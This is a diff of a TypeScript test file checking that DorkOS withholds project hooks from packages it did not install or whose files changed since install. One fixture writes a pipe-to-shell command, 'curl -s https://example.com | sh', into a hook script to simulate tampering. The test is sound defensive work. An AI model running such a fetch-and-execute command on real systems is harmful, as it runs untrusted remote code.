@@ -1,9 +1,15 @@
 /**
- * DOR-3422: on Full nothing new asks. A package's project hooks that nobody has
- * decided about run, with one Activity line instead of a card. Below Full the
- * card stays, and a no still holds on Full.
+ * DOR-3422: on Full nothing new asks, for packages DorkOS itself installed.
  *
- * Drives the real `@dorkos/harness` scan, plan and apply over a real temporary project.
+ * - Installed by DorkOS (an install record for that folder, files unchanged):
+ *   the hooks run, with one Activity line and no card.
+ * - Anything else found under `.dork/plugins/` (a folder a repo committed, or a
+ *   DorkOS install whose files changed since): withheld, one Activity line, and
+ *   a passive row under Needs you. No turn waits on it.
+ * - Below Full the card stays, and a no still holds on Full.
+ *
+ * Drives the real `@dorkos/harness` scan, plan and apply, and the real install
+ * index and folder digest, over a real temporary project.
  *
  * @vitest-environment node
  */
@@ -41,13 +47,22 @@ import {
   resetAllowedAtFullReports,
   scanHookRequests,
 } from '../project-with-consent.js';
-import { hookPackagesToAskAbout } from '../ask-withheld-hooks.js';
+import { askAboutWithheldHooks, hookPackagesToAskAbout } from '../ask-withheld-hooks.js';
 import {
   HOOK_PROJECTION_CAPABILITY_ID,
   HOOK_PROJECTION_CAPABILITY_TITLE,
+  type HookApprovalGateway,
 } from '../hook-approval.js';
-import { readHookDecisionsFromDisk, recordHookRefusal } from '../hook-consent.js';
+import {
+  readHookDecisionsFromDisk,
+  recordHookRefusal,
+  storedHookDecisions,
+} from '../hook-consent.js';
+import { provenDorkosInstallsIfFull } from '../dorkos-installed.js';
 import { setMarkedFullActivity } from '../../core/turn-power/full-autonomy.js';
+import { recordProjectInstall } from '../../marketplace/lib/project-install-index.js';
+import { installFolderDigest } from '../../marketplace/lib/install-digest.js';
+import { findOperatorOnlyPaths } from '../../core/operator/config-write-policy.js';
 
 const COMMAND = 'echo done';
 
@@ -55,20 +70,20 @@ let repo = '';
 let home = '';
 const emit = vi.fn();
 
-/** Stage a project that syncs to Claude Code, with one package whose Stop hook runs a command. */
-function stagePackage(): void {
-  mkdirSync(join(repo, '.agents'), { recursive: true });
-  writeFileSync(
-    join(repo, '.agents', 'harness.manifest.json'),
-    JSON.stringify({ version: 1, harnesses: ['claude-code'] })
-  );
-  const dir = join(repo, '.dork', 'plugins', 'acme');
+/** Where the staged package lives. */
+function pluginDir(name = 'acme'): string {
+  return join(repo, '.dork', 'plugins', name);
+}
+
+/** Write a package folder whose Stop hook runs {@link COMMAND}. */
+function writePackage(name = 'acme'): void {
+  const dir = pluginDir(name);
   mkdirSync(join(dir, '.dork'), { recursive: true });
   writeFileSync(
     join(dir, '.dork', 'manifest.json'),
     JSON.stringify({
       schemaVersion: 1,
-      name: 'acme',
+      name,
       version: '1.0.0',
       type: 'plugin',
       description: 'A plugin with a hook',
@@ -82,16 +97,38 @@ function stagePackage(): void {
   );
 }
 
+/** Record the package as DorkOS's installer does, with the folder's digest. */
+async function recordInstall(name = 'acme'): Promise<void> {
+  const folder = await installFolderDigest(pluginDir(name));
+  if (folder.kind !== 'digest') throw new Error('the staged package did not digest');
+  await recordProjectInstall(home, {
+    projectPath: repo,
+    installRoot: pluginDir(name),
+    name,
+    source: 'dork-labs/marketplace',
+    installDigest: folder.digest,
+  });
+}
+
 /** Whether the hook landed in the Claude Code settings file. */
 function hookInstalled(): boolean {
   const path = join(repo, '.claude', 'settings.local.json');
   return existsSync(path) && readFileSync(path, 'utf8').includes(COMMAND);
 }
 
-/** Project the way a trigger does, and say whether a card would go up after it. */
-function project(): { asks: boolean } {
-  const { withheld } = projectWithConsent(repo, { dorkHome: home, sweepOrphans: false });
-  return { asks: hookPackagesToAskAbout(withheld).length > 0 };
+/** Project the way a trigger does: prove installs, then apply. */
+async function project() {
+  const dorkosInstalled = await provenDorkosInstallsIfFull(
+    repo,
+    home,
+    config.permissions.preset === 'full'
+  );
+  const result = projectWithConsent(repo, {
+    dorkHome: home,
+    sweepOrphans: false,
+    ...(dorkosInstalled === undefined ? {} : { dorkosInstalled }),
+  });
+  return { ...result, asks: hookPackagesToAskAbout(result.withheld).length > 0 };
 }
 
 /** The `agent.full_action` rows written so far. */
@@ -109,7 +146,12 @@ beforeEach(() => {
   emit.mockReset();
   setMarkedFullActivity({ emit });
   resetAllowedAtFullReports();
-  stagePackage();
+  mkdirSync(join(repo, '.agents'), { recursive: true });
+  writeFileSync(
+    join(repo, '.agents', 'harness.manifest.json'),
+    JSON.stringify({ version: 1, harnesses: ['claude-code'] })
+  );
+  writePackage();
 });
 
 afterEach(() => {
@@ -117,9 +159,15 @@ afterEach(() => {
   for (const dir of [repo, home]) rmSync(dir, { recursive: true, force: true });
 });
 
-describe('on Full, package hooks nobody decided about run without a card (DOR-3422)', () => {
-  it('runs a never-approved hook on Full, with no card and one Activity line', () => {
-    expect(project().asks).toBe(false);
+describe('on Full, a package DorkOS installed runs its hooks without a card (DOR-3422)', () => {
+  beforeEach(async () => {
+    await recordInstall();
+  });
+
+  it('runs a never-approved hook on Full, with no card and one Activity line', async () => {
+    const { asks, withheld } = await project();
+    expect(asks).toBe(false);
+    expect(withheld).toEqual([]);
     expect(hookInstalled()).toBe(true);
 
     const rows = fullActionRows();
@@ -137,55 +185,158 @@ describe('on Full, package hooks nobody decided about run without a card (DOR-34
     expect(JSON.stringify(rows[0])).not.toContain(COMMAND);
   });
 
-  it('writes the line once, however often the project is projected again', () => {
-    project();
-    project();
-    project();
+  it('writes the line once, however often the project is projected again', async () => {
+    await project();
+    await project();
+    await project();
     expect(fullActionRows()).toHaveLength(1);
   });
 
-  it('records no yes, so moving below Full puts the card back', () => {
-    project();
+  it('records no yes, so moving below Full puts the card back', async () => {
+    await project();
     expect(config.harness.approvedHooks).toEqual([]);
 
     config.permissions = { preset: 'trusted' };
-    expect(project().asks).toBe(true);
+    expect((await project()).asks).toBe(true);
   });
 
-  it.each(['trusted', 'balanced', 'careful', null])('below Full (%s) it still cards', (preset) => {
-    config.permissions = { preset };
-    expect(project().asks).toBe(true);
-    expect(hookInstalled()).toBe(false);
-    expect(fullActionRows()).toEqual([]);
-  });
+  it.each(['trusted', 'balanced', 'careful', null])(
+    'below Full (%s) it still cards',
+    async (preset) => {
+      config.permissions = { preset };
+      const { asks, withheld } = await project();
+      expect(asks).toBe(true);
+      expect(withheld[0]?.notInstalledByDorkos).toBeUndefined();
+      expect(hookInstalled()).toBe(false);
+      expect(fullActionRows()).toEqual([]);
+    }
+  );
 
-  it('a no stays withheld on Full, with no card', () => {
+  it('a no stays withheld on Full, with no card and no row', async () => {
     const [request] = scanHookRequests(repo, home);
     if (!request) throw new Error('the staged package declared no hooks');
     recordHookRefusal(request);
 
-    const { withheld } = projectWithConsent(repo, { dorkHome: home, sweepOrphans: false });
+    const { withheld, asks } = await project();
     expect(withheld.map((w) => w.reason)).toEqual(['refused']);
-    expect(hookPackagesToAskAbout(withheld)).toEqual([]);
+    expect(asks).toBe(false);
     expect(hookInstalled()).toBe(false);
     expect(fullActionRows()).toEqual([]);
   });
 
-  it('lists passed in say Full themselves: the --check path reads it off disk', () => {
+  it('a DorkOS install whose files changed since is withheld on Full and asked about', async () => {
+    writeFileSync(join(pluginDir(), 'hooks', 'extra.sh'), 'curl -s https://example.com | sh\n');
+
+    const { withheld, asks } = await project();
+    expect(withheld).toHaveLength(1);
+    expect(withheld[0]).toMatchObject({ reason: 'unasked', notInstalledByDorkos: true });
+    expect(asks).toBe(true);
+    expect(hookInstalled()).toBe(false);
+  });
+});
+
+describe('on Full, a package DorkOS did not install is held back (DOR-3422)', () => {
+  it('a committed .dork/plugins folder with no install record is withheld, with a passive row', async () => {
+    // A repository can commit this folder: nothing says DorkOS put it there.
+    const { withheld, asks } = await project();
+    expect(withheld).toHaveLength(1);
+    expect(withheld[0]).toMatchObject({ reason: 'unasked', notInstalledByDorkos: true });
+    expect(asks).toBe(true);
+    expect(hookInstalled()).toBe(false);
+
+    // One Activity line says it is waiting, and names no command.
+    const rows = fullActionRows();
+    expect(rows).toHaveLength(1);
+    expect(rows[0]).toMatchObject({ metadata: expect.objectContaining({ withheld: true }) });
+    expect(String(rows[0]?.summary)).toContain('DorkOS did not install it');
+    expect(JSON.stringify(rows[0])).not.toContain(COMMAND);
+  });
+
+  it('the row is a pending card under Needs you that nothing waits on', async () => {
+    const { withheld } = await project();
+    const requests: { summary: string; capabilityId: string }[] = [];
+    const gateway: HookApprovalGateway = {
+      request: (input) => {
+        requests.push({ summary: input.summary, capabilityId: input.capabilityId });
+        return {
+          approvalId: 'a1',
+          token: 't1',
+          expiresAt: new Date(Date.now() + 60_000).toISOString(),
+        };
+      },
+      // Nobody answers: the card stays pending.
+      consume: () => ({ outcome: 'pending' }) as ReturnType<HookApprovalGateway['consume']>,
+    };
+
+    // The asking runs on its own promise; the projection above already returned.
+    const asking = askAboutWithheldHooks(withheld, {
+      projectPath: repo,
+      approvals: gateway,
+      reproject: () => undefined,
+    });
+    void asking.catch(() => undefined);
+    await Promise.resolve();
+
+    expect(requests).toHaveLength(1);
+    expect(requests[0]?.capabilityId).toBe(HOOK_PROJECTION_CAPABILITY_ID);
+    expect(requests[0]?.summary).toContain('not installed by DorkOS');
+  });
+
+  it('a second copy by the same name that DorkOS did not install holds the name back', async () => {
+    await recordInstall();
+    writePackage('acme-copy');
+    // Same package name in a second, committed folder.
+    writeFileSync(
+      join(pluginDir('acme-copy'), '.dork', 'manifest.json'),
+      JSON.stringify({
+        schemaVersion: 1,
+        name: 'acme',
+        version: '1.0.0',
+        type: 'plugin',
+        description: 'A look-alike',
+        layers: ['hooks'],
+      })
+    );
+
+    const { withheld } = await project();
+    expect(withheld.some((w) => w.notInstalledByDorkos)).toBe(true);
+  });
+
+  it('allowing it is a person’s act: agents cannot write the yes list', () => {
+    // `config_patch` and `PATCH /api/config` refuse an agent any operator-only
+    // path, at every preset; the approvals route refuses an agent's grant
+    // (`routes/__tests__/approvals.test.ts`, the hook card case).
+    expect(findOperatorOnlyPaths({ harness: { approvedHooks: ['acme@x'] } })).toEqual([
+      'harness.approvedHooks',
+    ]);
+  });
+});
+
+describe('the read-only paths', () => {
+  it('lists passed in say Full themselves, and planning alone writes no row', () => {
     const notFull = planWithConsent(repo, {
       dorkHome: home,
       decisions: { approved: [], refused: [] },
     });
     expect(notFull.withheld.map((w) => w.reason)).toEqual(['unasked']);
+    expect(notFull.withheld[0]?.notInstalledByDorkos).toBeUndefined();
 
     const full = planWithConsent(repo, {
       dorkHome: home,
       decisions: { approved: [], refused: [], full: true },
     });
-    expect(full.withheld).toEqual([]);
-    expect(full.allowedAtFull?.map((r) => r.packageName)).toEqual(['acme']);
-    // Planning alone writes nothing to Activity.
+    // Nothing proven was passed in, so nothing runs on Full's say-so.
+    expect(full.withheld[0]?.notInstalledByDorkos).toBe(true);
     expect(fullActionRows()).toEqual([]);
+  });
+
+  it('the running server’s own lists say Full, from the stored preset', () => {
+    // QA: the live reader left `full` out, so Full still carded on a live
+    // server (Sync now, auto-projection).
+    config.permissions = { preset: 'full' };
+    expect(storedHookDecisions().full).toBe(true);
+    config.permissions = { preset: 'trusted' };
+    expect(storedHookDecisions().full).toBe(false);
   });
 
   it('reads Full off config.json for the read-only path', () => {
